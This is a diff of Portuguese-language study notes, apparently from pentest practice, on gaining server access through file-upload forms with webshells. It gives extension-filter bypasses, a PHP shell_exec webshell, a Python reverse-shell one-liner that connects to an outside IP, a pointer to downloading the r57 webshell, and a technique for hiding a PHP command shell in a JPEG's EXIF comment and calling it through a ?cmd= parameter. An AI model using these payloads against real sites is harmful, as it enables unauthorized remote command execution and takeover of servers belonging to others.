@@ -8,7 +8,7 @@ até mesmo, controlar o sistema operacional do servidor (inclusive instalar malw
 -> linguagens usadas: php, python, ruby, asp.net ...
 ___________________________________________________________________________________________________________________________________________________________
 
-EXEMPLO DE CASO
+WEBSHELL BÁSICO
 
 -> contexto: /admin de uma aplicação, existe um formulário para fazer upload de um arquivo
 
@@ -16,6 +16,7 @@ EXEMPLO DE CASO
     -> crio um arquivo .php (a aplicação bloqueia pois não é permitido)
     -> passo o script do .php para um arquivo com extensao .jpeg.php para tentar driblar (mas ainda é bloqueado)
     -> passo o script do .jpeg.php para um arquivo c extensao .php5 que geralmente esquecem de filtrar (e funciona)
+        -> .php / .jpg.php / .php5 / .php5?.jpg / 
         -> <?php
                 echo shell_exec('ls'); // vai dar um ls
             ?>
@@ -48,9 +49,56 @@ EXEMPLO DE CASO
         -> pronto, agora há uma conexaoao entre o servidor da aplicação e o seu sistema, mas, com voce executando um shell reverso
         -> é muito difícil funcionar pois o netcat para servidores muitas vezes nao tem a opção "-e"
         -> pode-se executar, então, uma tentativa de shell reversa com um código python
-            -> pentestmonkey. net/cheat-sheet/shells/reverse-shell-cheat-sheet
+            -> pentestmonkey. net/cheat-sheet/shells/reverse-shell-cheat-sheet (Guarda varios tipos de codigo que executam shell reversa)
 
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
     3.2) CONECTANDO (SHELL REVERSA USANDO PYTHON)
     -> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("000.000.000.111",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+    4) CONECTANDO ATRAVÉS DE UMA WEBSHELL PRONTA
+    -> na existem várias webshells mais completas (isto é, que dispõem de um painel gráfico e que permitem um ataque maior)
+    -> um bastante utilizado é o "r57"
+        -> é possivel baixar atraves do r57.gen.tr
+    -> faz o download do arquivo e coloca a extensao que dribla a segurança do site
+    -> faz o upload no site e vai até o url que se encontra
+    -> o webshell vai ser renderizado
+
+___________________________________________________________________________________________________________________________________________________________
+
+WEBSHELL AVANÇADO
+
+1) EXPLICAÇÃO DO PORQUE NAO FUNCOINA EM ALGUNS SISTEMAS O WEBSHELL BÁSICO
+-> Em alguns casos, é barrado todo tipo de tentativa
+    -> Isso porque as vezes as aplicações tratam o envio do arquivo através do material que contém dentro dele mesmo, isto é:
+    mesmo que você intercepte uma requisiçao http POST que envia um webshell disfarçado como um jpeg (ou seja, que até mesmo o header é
+    alterado para parecer que o conteúdo enviado é legítimo [comparando headers de requisiçoes legitimas vs. ilegitimas e substituindo as diferenças]),
+    não irá funcionar
+-> portanto, pode funcionar inserir o código malicioso dentro de um arquivo legítimo (que contém metadados legítimos)
+    -> uma boa ferramenta para mexer com metadados é o "exiftools"
+
+2) USANDO EXIFTOOLS PARA EDITAR METADADOS DE ARQUIVOS LEGÍTIMOS E PASSÁVEIS
+-> exiftools lampada.jpg
+    -> vai mostrar os meta dados dessa imagem
+        -> directory: tal diretorio
+           file size: x kB
+           ...
+           Comment: comentario aleatorio relacoinado a essa imagem
+           ...
+           image size: 400x400
+-> A parte do "comment" é apenas um metadado avulso dessa imagem e é possivel injetar um codigo malicioso dentro dele
+-> exiftools -comment= "<?php echo shell_exec($_GET["cmd"]); ?>" lampaga.jpg
+-> após o funcionamento do codigo acima, se voce for ver os metadados da imagem, vai ser possível perceber que alguns caracteres (como $ e "") foram "apagados",
+isso porque sao caracteres especiais no shell, portanto, é necessário fazer um escape neles colocando "\" antes de todos os caracteres especiais
+-> exiftools -comment="<?php echo shell_exec(\$_GET[\"cmd\"]); ?>"
+    -> agora eles não serão filtrados pelo shell
+
+3) UPLOAD NO SITE E SHELL REVERSA
+-> agora basta fazer o processo de sempre de fazer o upload no site e ir até o url que se encontra essa imagem.
+-> mas, neste caso, você terá que fazer o inspect element e procurar o código da imagem, clicá-lo e executar os comandos a partir do url gerado pelo click da imagem
+    -> ex: site.com/admin/uploads/93024329.jpg
+    -> site.com/admin/uploads/93024329.jpg?cmd=ls
+        -> pronto, agora, em algum lugar de dentro dos caracteres que simbolizam a imagem, vai ter o echo do que você pedir do sistema do servidor
+        -> só colocar o mesmo código de webshell de python visto anteriormente
